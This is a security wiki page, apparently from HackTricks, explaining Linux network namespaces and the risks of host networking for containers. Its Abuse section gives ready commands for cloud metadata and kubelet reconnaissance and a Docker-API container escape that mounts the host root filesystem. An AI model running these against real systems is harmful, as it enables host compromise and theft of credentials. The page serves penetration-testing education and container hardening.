# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

The network namespace isolates network-related resources such as interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, and the contents of files like `/proc/net`. This is why a container can have what looks like its own `eth0`, its own local routes, and its own loopback device without owning the host's real network stack.

Security-wise, this matters because network isolation is about much more than port binding. A private network namespace limits what the workload can directly observe or reconfigure. Once that namespace is shared with the host, the container may suddenly gain visibility into host listeners, host-local services, and network control points that were never meant to be exposed to the application.

## Operation

A freshly created network namespace begins with an empty or almost empty network environment until interfaces are attached to it. Container runtimes then create or connect virtual interfaces, assign addresses, and configure routes so the workload has the expected connectivity. In bridge-based deployments, this usually means the container sees a veth-backed interface connected to a host bridge. In Kubernetes, CNI plugins handle the equivalent setup for Pod networking.

This architecture explains why `--network=host` or `hostNetwork: true` is such a dramatic change. Instead of receiving a prepared private network stack, the workload joins the host's actual one.

## Lab

You can see a nearly empty network namespace with:

```bash
sudo unshare --net --fork bash
ip addr
ip route
```

And you can compare normal and host-networked containers with:

```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```

The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Runtime Usage

Docker and Podman normally create a private network namespace for each container unless configured otherwise. Kubernetes usually gives each Pod its own network namespace, shared by the containers inside that Pod but separate from the host. Incus/LXC systems also provide rich network-namespace based isolation, often with a wider variety of virtual networking setups.

The common principle is that private networking is the default isolation boundary, while host networking is an explicit opt-out from that boundary.

## Misconfigurations

The most important misconfiguration is simply sharing the host network namespace. This is sometimes done for performance, low-level monitoring, or convenience, but it removes one of the cleanest boundaries available to containers. Host-local listeners become reachable in a more direct way, localhost-only services may become accessible, and capabilities such as `CAP_NET_ADMIN` or `CAP_NET_RAW` become much more dangerous because the operations they enable are now applied to the host's own network environment.

Another problem is overgranting network-related capabilities even when the network namespace is private. A private namespace does help, but it does not make raw sockets or advanced network control harmless.

In Kubernetes, `hostNetwork: true` also changes how much faith you can place in Pod-level network segmentation. Kubernetes documents that many network plugins cannot properly distinguish `hostNetwork` Pod traffic for `podSelector` / `namespaceSelector` matching and therefore treat it as ordinary node traffic. From an attacker's point of view, that means a compromised `hostNetwork` workload should often be treated as a node-level network foothold rather than as a normal Pod still constrained by the same policy assumptions as overlay-network workloads.

## Abuse

In weakly isolated setups, attackers may inspect host listening services, reach management endpoints bound only to loopback, sniff or interfere with traffic depending on the exact capabilities and environment, or reconfigure routing and firewall state if `CAP_NET_ADMIN` is present. In a cluster, this can also make lateral movement and control-plane reconnaissance easier.

If you suspect host networking, start by confirming that the visible interfaces and listeners belong to the host rather than to an isolated container network:

```bash
ip addr
ip route
ss -lntup | head -n 50
```

Loopback-only services are often the first interesting discovery:

```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```

If network capabilities are present, test whether the workload can inspect or alter the visible stack:

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```

On modern kernels, host networking plus `CAP_NET_ADMIN` may also expose the packet path beyond simple `iptables` / `nftables` changes. `tc` qdiscs and filters are namespace-scoped too, so in a shared host network namespace they apply to the host interfaces the container can see. If `CAP_BPF` is additionally present, network-related eBPF programs such as TC and XDP loaders become relevant as well:

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
  echo "== $i =="
  tc qdisc show dev "$i" 2>/dev/null
  tc filter show dev "$i" ingress 2>/dev/null
  tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```

This matters because an attacker may be able to mirror, redirect, shape, or drop traffic at the host interface level, not just rewrite firewall rules. In a private network namespace those actions are contained to the container view; in a shared host namespace they become host-impacting.

In cluster or cloud environments, host networking also justifies quick local recon of metadata and control-plane-adjacent services:

```bash
for u in \
  http://169.254.169.254/latest/meta-data/ \
  http://100.100.100.200/latest/meta-data/ \
  http://127.0.0.1:10250/pods; do
  curl -m 2 -s "$u" 2>/dev/null | head
done
```

### Full Example: Host Networking + Local Runtime / Kubelet Access

Host networking does not automatically provide host root, but it often exposes services that are intentionally reachable only from the node itself. If one of those services is weakly protected, host networking becomes a direct privilege-escalation path.

Docker API on localhost:

```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Kubelet on localhost:

```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```

Impact:

- direct host compromise if a local runtime API is exposed without proper protection
- cluster reconnaissance or lateral movement if kubelet or local agents are reachable
- traffic manipulation or denial of service when combined with `CAP_NET_ADMIN`

## Checks

The goal of these checks is to learn whether the process has a private network stack, what routes and listeners are visible, and whether the network view already looks host-like before you even test capabilities.

```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```

What is interesting here:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

When reviewing a container, always evaluate the network namespace together with the capability set. Host networking plus strong network capabilities is a very different posture from bridge networking plus a narrow default capability set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
